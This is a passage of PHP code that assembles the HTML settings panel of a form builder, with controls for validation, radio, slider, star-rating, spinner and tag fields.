																		<button class="btn btn-default center" type="button"><span class="glyphicon glyphicon-align-center"></span>&nbsp;&nbsp;Center</button>
																		<button class="btn btn-default right" type="button"><span class="glyphicon glyphicon-align-right"></span>&nbsp;&nbsp;Right</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												
											$output .= '</div>';
											
											
											
											
											
											
											//font / size
											$output .= '<div class="row">';
												/*$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text" style="z-index:1000">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Font</label>';
														$output .=	'<div class="google-fonts-dropdown-help-text input-group input-group-sm"><select name="help-text-fonts" class="sfm form-control"></select><span class="input-group-addon"><i><input type="checkbox" checked="checked" title="Show Preview" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-font-preview"></i></span></div>';
													$output .= '</div>';
												$output .= '</div>';*/
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-help-text">';
													$output .= '<div class="input_holder">';
														$output .= '<label>Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  help-text-size">
																		<button class="btn btn-default small" type="button">Small</button>
																		<button class="btn btn-default  normal" type="button">Normal</button>
																		<button class="btn btn-default  large" type="button">Large</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';											
											              
/******************************************************************************************************************************/
//ERROR MESSAGE SETTINGS			               
											//Text / position
											$output .= '<div class="row">';
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  settings-validation">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Required</label>';
														$output .= '<div class="btn-toolbar" role="toolbar">
																	<div class="btn-group btn-group-xs  required">
																		<button type="button" class="btn btn-default btn-sm yes"><span class="glyphicon glyphicon-thumbs-up"></span>&nbsp;&nbsp;Yes</button>
																		<button type="button" class="btn btn-default btn-sm no btn-primary">&nbsp;<span class="glyphicon glyphicon-thumbs-down"></span>&nbsp;&nbsp;No</button>
																	  </div>
																	<div class="btn-group btn-group-xs  required-star">
																		<button type="button" class="btn btn-default btn-sm full btn-primary">&nbsp;<span class="glyphicon glyphicon-star"></span>&nbsp;</button>
																		<button type="button" class="btn btn-default btn-sm empty">&nbsp;<span class="glyphicon glyphicon-star-empty"></span>&nbsp;</button>
																	  	<button type="button" class="btn btn-default btn-sm asterisk">&nbsp;<span class="glyphicon glyphicon-asterisk"></span>&nbsp;</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden settings-validation-md-text  setting-validation-text" style="z-index:100;">';
													$output .= '<div class="input_holder">';											
														$output .= '<label>Validate as:</label><br />';
														$output .= '<button type="button" class="btn btn-primary dropdown-toggle validate-as" data-toggle="dropdown"><span class="fa fa-thumbs-o-up"></span>&nbsp;&nbsp;Any Format</button>
																		<ul class="dropdown-menu validate-as">
																		  <li><a href="#" class=""><span class="fa fa-thumbs-o-up"></span>&nbsp;&nbsp;Any format</a></li>
																		  <li><a href="#" class="email"><span class="fa fa-envelope-o"></span>&nbsp;&nbsp;Email</a></li>
																		  <li><a href="#" class="url"><span class="fa fa-link"></span>&nbsp;&nbsp;URL</a></li>
																		  <li><a href="#" class="phone_number"><span class="fa fa-phone"></span>&nbsp;&nbsp;Phone number</a></li>
																		  <li><a href="#" class="numbers_only"><span class="fa fa-sort-numeric-desc"></span>&nbsp;&nbsp;Numbers Only</a></li>
																		  <li><a href="#" class="text_only"><span class="fa fa-sort-alpha-asc"></span>&nbsp;&nbsp;Text Only</a></li>
																		</ul>
																	 ';
													$output .= '</div>';
													$output .= '</div>';
												
												//$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden settings-validation  settings-all" style="clear:both;"></div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-validation error_color" style="z-index:90;">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Required Message</label>';
														$output .= '<input id="the_error_mesage" type="text" value="" name="the_error_mesage" class="form-control"><!--<div class="input-group input-group-sm">
																		<div class="input-group-btn">
																			<button type="button" class="btn btn-default dropdown-toggle validation-color colorpicker-element" style="padding-top:7px !important;" data-toggle="dropdown"><i class="btn-default"></i></button>
																			<ul class="dropdown-menu error-color">
																			  <li><a href="#" style="border:1px solid #ccc"></a></li>	
																			  <li><a href="#" class="alert-info"></a></li>
																			  <li><a href="#" class="alert-success"></a></li>
																			  <li><a href="#" class="alert-warning"></a></li>
																			  <li><a href="#" class="alert-danger"></a></li>
																			</ul>
																	  </div></div>-->
														';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden settings-validation-md-text setting-validation-text setting-validation-file-input">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Secondary message</label>';
														$output .= '<input id="set_secondary_error" type="text" value="" name="set_secondary_error" class="form-control">';
													$output .= '</div>';
												$output .= '</div>';
												
												
													
											
												/*$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-validation">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Popup Position</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  error-position">
																		<button class="btn btn-default btn-primary top" type="button">Top</button>
																		<button class="btn btn-default  right" type="button">Right</button>
																		<button class="btn btn-default  bottom" type="button">Bottom</button>
																		<button class="btn btn-default  left" type="button">Left</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';*/
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-text setting-textarea setting-validation-text setting-validation-textarea" style="">';
													$output .= '<div class="input_holder">';											
														$output .= '<label>Maximum Characters</label>';
														$output .= '<div class="input-group input-group-sm"><input id="set_max_length" type="text" name="set_max_length" class="form-control">
																	<span class="input-group-addon"><i><input type="checkbox" title="Show Count" data-placement="top" data-toggle="tooltip" class="bs-tooltip" name="show-max-count" value="#66afe9"></i></span>
																	  <div class="input-group-btn" style="border-radius:0 !important; display:none;">
																		<button type="button" class="btn btn-default dropdown-toggle max-count-color colorpicker-element" style="border-radius:0 !important;padding-top:7px !important;" data-toggle="dropdown"><i class="label-success"></i></button>
																		<ul class="dropdown-menu count-color">
																		  <li><a href="#" class="label-primary"></a></li>
																		  <li><a href="#" class="label-info"></a></li>
																		  <li><a href="#" class="label-success"></a></li>
																		  <li><a href="#" class="label-warning"></a></li>
																		  <li><a href="#" class="label-danger"></a></li>
																		  <li><a href="#" class="alert-info"></a></li>
																		  <li><a href="#" class="alert-success"></a></li>
																		  <li><a href="#" class="alert-warning"></a></li>
																		  <li><a href="#" class="alert-danger"></a></li>
																		</ul>
																	  </div>
																	 <div class="input-group-btn"  style="display: none;">
																		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown"><span class="caret"></span></button>
																		<ul class="dropdown-menu max-count-position">
																		  <li class="top"><a href="#">Top</a></li>
																		  <li class="right"><a href="#">Right</a></li>
																		  <li class="bottom"><a href="#" class="alert-info">Bottom</a></li>
																		  <li class="left"><a href="#">Left</a></li>
																		</ul>
																	  </div></div>';
													$output .= '</div>';
													$output .= '</div>';
												
											$output .= '</div>';
											
											
											
											
/******************************************************************************************************************************/
//RADIO SETTINGS												
											$output .= '<div class="row">';
																						
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select icons">';
													$output .= '<div class="input_holder ">';		
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="radio-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_radio_icon set_icon" data-set-class="set_radio" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Select Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select icons selected-color" style="z-index:10000 !important;">';
													$output .= '<div class="input_holder ">';						
														
														$output .= '
														<div class="btn-group btn-group-xs ">
														<button type="button"  data-toggle="dropdown" class="btn btn-default radio-color-class colorpicker-element">
														<i class="btn-default"></i>
														</button>
														<div class="btn-group btn-group-xs ">
														<button data-toggle="dropdown" class="btn btn-default radio-color dropdown-toggle" type="button">
														Selected Radio Color
														</button><ul class="dropdown-menu selected-radio-color">
															  <li><a href="#" style="border:1px solid #ccc"></a></li>	
															  <li><a href="#" class="label-primary"></a></li>
															  <li><a href="#" class="label-info"></a></li>
															  <li><a href="#" class="label-success"></a></li>
															  <li><a href="#" class="label-warning"></a></li>
															  <li><a href="#" class="label-danger"></a></li>
															  <li><a href="#" class="alert-info"></a></li>
															  <li><a href="#" class="alert-success"></a></li>
															  <li><a href="#" class="alert-warning"></a></li>
															  <li><a href="#" class="alert-danger"></a></li>
															</ul>';
														$output .= '</div></div>';
														$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
					
					
					$output .= '<div class="row">';
						$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-classic-radio">';
									$output .= '<div class="input_holder">';											
										$output .= '<label>Radios</label>';
										$output .= '<textarea id="set_radios" name="set_radios" class="form-control"></textarea>';
									$output .= '</div>';
								$output .= '</div>';
						
								
						
						$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-image-select">';
									$output .= '<div class="input_holder">';											
										$output .= '<label>Thumbs</label>';
										$output .= '<textarea id="set_image_selection" name="set_image_selection" class="form-control"></textarea>';
									$output .= '</div>';
								$output .= '</div>';
						
						
						
						
						
						$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Label Color</label>';
								$output .= '<div id="radio-label-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
												<span class="input-group-addon"><i></i></span>
												<input type="text" value="#000000" class="form-control" />
												<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
											</div>';
							$output .= '</div>';
						$output .= '</div>';
					$output .= '</div>';
					$output .= '<div class="row">';	
						$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Background Color</label>';
								$output .= '<div id="radio-background-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
												<span class="input-group-addon"><i></i></span>
												<input type="text" value="#FFF" class="form-control" />
												<span class="input-group-addon reset" data-default="#FFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
											</div>';
							$output .= '</div>';
						$output .= '</div>';
						
						$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Border Color</label>';
								$output .= '<div id="radio-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
												<span class="input-group-addon"><i></i></span>
												<input type="text" value="#CCCCCC" class="form-control" />
												<span class="input-group-addon reset" data-default="#CCCCCC"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
											</div>';
							$output .= '</div>';
						$output .= '</div>';
						
						$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-image-select">';
									$output .= '<div class="input_holder ">';
														$output .= '<label>Thumb Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  thumb-size">
																		<button class="btn btn-default small" type="button">Small</button>
																		<button class="btn btn-default  normal" type="button">Normal</button>
																		<button class="btn btn-default  large" type="button">Large</button>
																		<button class="btn btn-default  xlarge" type="button">X-Large</button>
																	  </div>
																	</div>';
													$output .= '</div>';
								$output .= '</div>';
						
						$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-radio setting-image-select">';
							$output .= '<div class="input_holder ">';
								$output .= '<label>Display</label>';
								$output .= '<div role="toolbar" class="btn-toolbar">
											  <div class="btn-group btn-group-xs  display-radios-checks">
												<button class="btn btn-default btn-primary inline" type="button"><span class="glyphicon glyphicon-arrow-right"></span>Inline</button>
												<button class="btn btn-default 1c" type="button"><span class="glyphicon glyphicon-arrow-down"></span>1 Col</button>
												<button class="btn btn-default 2c" type="button">2 Col</button>
												<button class="btn btn-default 3c" type="button">3 Col</button>
												<button class="btn btn-default 4c" type="button">4 Col</button>
											  </div>
											</div>';
							$output .= '</div>';
						$output .= '</div>';
						
					$output .= '</div>';



/******************************************************************************************************************************/
//SlIDER SETTINGS												
											$output .= '<div class="row">';
												
														
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider icons" style="z-index:1000001 !important;">';
													$output .= '<div class="input_holder ">';	
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="slider-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_slider_icon set_icon" data-set-class="set_slider_icon" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Handle Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
														$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider icons selected-color">';
															$output .= '<div class="input_holder ">';
														
												
														
														
														$output .= '
														<div class="btn-group btn-group-xs ">
														<button type="button"  data-toggle="dropdown" class="btn btn-default slider-color-class colorpicker-element" style="z-index:10000 !important;">
														<i class="btn-default"></i>
														</button>
														<div class="btn-group btn-group-xs ">
														<button data-toggle="dropdown" class="btn btn-default slider-handel-color dropdown-toggle" type="button">
														Handle Color
														</button><ul class="dropdown-menu selected-slider-handel-color">
															  <li><a href="#" class="ui-state-default" style="border:1px solid #ccc"></a></li>	
															  <li><a href="#" class="label-primary"></a></li>
															  <li><a href="#" class="label-info"></a></li>
															  <li><a href="#" class="label-success"></a></li>
															  <li><a href="#" class="label-warning"></a></li>
															  <li><a href="#" class="label-danger"></a></li>
															  <li><a href="#" class="alert-info"></a></li>
															  <li><a href="#" class="alert-success"></a></li>
															  <li><a href="#" class="alert-warning"></a></li>
															  <li><a href="#" class="alert-danger"></a></li>
															</ul>';
														$output .= '</div></div>';
														$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Minimum value</label>';
															$output .= '<input type="text" name="minimum_value" id="minimum_value" class="form-control" />';
														$output .= '</div>';
													$output .= '</div>';
												
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Maximum value</label>';
														$output .= '<input type="text" name="maximum_value" id="maximum_value" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Starting value</label>';
														$output .= '<input type="text" name="start_value" id="start_value" class="form-control" />';
													$output .= '<span class="help-block">&nbsp;</span></div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Step value</label>';
															$output .= '<input type="text" name="step_value" id="step_value" class="form-control" />';
														$output .= '</div>';
													$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Count Text</label>';
															$output .= '<div class="input_holder">';
															$output .= '<input type="text" name="count_text" id="count_text" class="form-control" />';
														 //   $output .= '<span class="input-group-addon count-text-bold"><span class="glyphicon glyphicon-bold"></span></span>';
															//$output .= '<span class="input-group-addon count-text-italic"><span class="glyphicon glyphicon-italic"></span></span>';
														$output .= '</div>'; //<span class="help-block">Use {x} for count value substitution. HTML enabled.</span>
															
														$output .= '</div>';
													$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-slider" style="clear:both;"></div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Handle Text Color</label>';
															$output .= '<div id="slide-handel-text-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																			<span class="input-group-addon"><i></i></span>
																			<input type="text" value="#000000" class="form-control" />
																			<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																		</div>';
														$output .= '</div>';
													$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Handle Background Color</label>';
														$output .= '<div id="slider-handel-background-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Handle Border Color</label>';
														$output .= '<div id="slider-handel-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#CCCCCC" class="form-control" />
																		<span class="input-group-addon reset" data-default="#CCCCCC"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Slider Border Color</label>';
														$output .= '<div id="slider-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#CCCCCC" class="form-control" />
																		<span class="input-group-addon reset" data-default="#CCCCCC"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Color</label>';
														$output .= '<div id="slider-background-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-slider">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Fill Color</label>';
														$output .= '<div id="slider-fill-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#f2f2f2" class="form-control" />
																		<span class="input-group-addon reset" data-default="#f2f2f2"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
											$output .= '</div>';
/******************************************************************************************************************************/
//STAR RATING SETTINGS												
											$output .= '<div class="row">';
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-star">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Total Stars</label>';
														$output .= '<input type="text" name="total_stars" id="total_stars" class="form-control">';
														$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-star">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Enable Half Stars</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
															  <div class="btn-group btn-group-xs  enable-half-star">
																<button class="btn btn-default yes" type="button"><span class="fa fa-star-half-o"></span>&nbsp;&nbsp;Yes</button>
																<button class="btn btn-default  btn-primary no" type="button"><span class="fa fa-star"></span>&nbsp;&nbsp;No</button>
															  </div>
															</div>';
														$output .= '</div>';
												$output .= '</div>';
																	
										$output .= '</div>';


/******************************************************************************************************************************/
//SPINNER SETTINGS												
										$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  settings-spinner" style="clear:both;"></div>';
											
											$output .= '<div class="row">';
												//down arrow
																							
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner icons" style="z-index:1000001 !important;">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Touch Down Icon</label><br />';
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="down-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_spinner_down_icon set_icon" data-set-class="set_spinner_down_icon" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Select Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
														
														
														
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner icons selected-color" style="z-index:1000000 !important;">';
															$output .= '<div class="input_holder ">';											
																$output .= '<label>Color</label><br />';
														
														
														$output .= '
														<div class="btn-group btn-group-xs ">
														<button type="button"  data-toggle="dropdown" class="btn btn-default spinner-down colorpicker-element">
														<i class="btn-default"></i>
														</button>
														<div class="btn-group btn-group-xs ">
														<button data-toggle="dropdown" class="btn btn-default down_icon dropdown-toggle" type="button">
														Color
														</button><ul class="dropdown-menu spinner-down-color" style="z-index:10000 !important;">
															  <li><a href="#" class="ui-state-default" style="border:1px solid #ccc"></a></li>	
															  <li><a href="#" class="label-primary"></a></li>
															  <li><a href="#" class="label-info"></a></li>
															  <li><a href="#" class="label-success"></a></li>
															  <li><a href="#" class="label-warning"></a></li>
															  <li><a href="#" class="label-danger"></a></li>
															  <li><a href="#" class="alert-info"></a></li>
															  <li><a href="#" class="alert-success"></a></li>
															  <li><a href="#" class="alert-warning"></a></li>
															  <li><a href="#" class="alert-danger"></a></li>
															</ul>';
														$output .= '</div></div>';
														$output .= '</div>';
												$output .= '</div>';
												//up arrow
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner icons">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Touch Up Icon</label><br />';
														$output .= '<div class="btn-group">';
															$output .= '<button type="button" data-toggle="dropdown" class="btn btn-default">';
																$output .= '<span id="up-icon" class="current-icon fa fa-check"></span>';
															$output .= '</button>';
															$output .= '<div class="btn-group btn-group-xs ">';
																$output .= '<button class="btn btn-primary set_spinner_up_icon set_icon" data-set-class="set_spinner_up_icon" data-toggle="modal" data-backdrop="static" data-target="#iconSet" type="button">';
																	$output .= 'Select Icon';
																$output .= '</button>';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner icons selected-color">';
															$output .= '<div class="input_holder ">';											
																$output .= '<label>Color</label><br />';
														
														
														$output .= '
														<div class="btn-group btn-group-xs ">
														<button type="button"  data-toggle="dropdown" class="btn btn-default spinner-up colorpicker-element" style="z-index:10000 !important;">
														<i class="btn-default"></i>
														</button>
														<div class="btn-group btn-group-xs ">
														<button data-toggle="dropdown" class="btn btn-default up_icon dropdown-toggle" type="button">
														Color
														</button><ul class="dropdown-menu spinner-up-color">
															  <li><a href="#" class="ui-state-default" style="border:1px solid #ccc"></a></li>	
															  <li><a href="#" class="label-primary"></a></li>
															  <li><a href="#" class="label-info"></a></li>
															  <li><a href="#" class="label-success"></a></li>
															  <li><a href="#" class="label-warning"></a></li>
															  <li><a href="#" class="label-danger"></a></li>
															  <li><a href="#" class="alert-info"></a></li>
															  <li><a href="#" class="alert-success"></a></li>
															  <li><a href="#" class="alert-warning"></a></li>
															  <li><a href="#" class="alert-danger"></a></li>
															</ul>';
														$output .= '</div></div>';
														$output .= '</div>';
												$output .= '</div>';
												
												
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Minimum value</label>';
															$output .= '<input type="text" name="spin_minimum_value" id="spin_minimum_value" class="form-control" />';
														$output .= '</div>';
													$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Maximum value</label>';
														$output .= '<input type="text" name="spin_maximum_value" id="spin_maximum_value" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Starting value</label>';
														$output .= '<input type="text" name="spin_start_value" id="spin_start_value" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Step value</label>';
														$output .= '<input type="text" name="spin_step_value" id="spin_step_value" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-spinner">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Decimal places</label>';
														$output .= '<input type="text" name="spin_decimal" id="spin_decimal" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
																	
										$output .= '</div>';

												
												
											
/******************************************************************************************************************************/
//TAG SETTINGS												
											$output .= '<div class="row">';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden settings-math-logic">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Current fields</label>';
														$output .= '<select multiple="multiple" name="current_fields" class="form-control">
																	</select>';
													$output .= '</div>'; 
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden settings-math-logic">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Math Equation</label>';
														$output .= '<textarea id="set_math_logic_equation" name="set_math_logic_equation" style="min-height:399px"; class="form-control">
																	</textarea>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-math-logic">';
													$output .= '<div class="input_holder ">';											
														$output .= '<label>Input Name</label>';
														$output .= '<input id="set_math_input_name" type="text" name="set_math_input_name" class="form-control">';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Maximum Tags</label>';
														$output .= '<input type="text" name="max_tags" id="max_tags" class="form-control" />';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  settings-input setting-slider setting-panel setting-tags setting-button">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Corners</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  input-corners">
																		<button class="btn btn-default square" type="button">Square</button>
																		<button class="btn btn-default btn-primary normal" type="button">Rounded</button>
																		<!--<button class="btn btn-default full_rounded" type="button">Fully rounded</button>-->
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags">';
														$output .= '<div class="input_holder ">';
															$output .= '<label>Color</label>';
															$output .= '<div id="tags-text-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																			<span class="input-group-addon"><i></i></span>
																			<input type="text" value="#000000" class="form-control" />
																			<span class="input-group-addon reset" data-default="#000000"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																		</div>';
														$output .= '</div>';
													$output .= '</div>';
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Color</label>';
														$output .= '<div id="tags-background-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#FFFFFF" class="form-control" />
																		<span class="input-group-addon reset" data-default="#FFFFFF"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
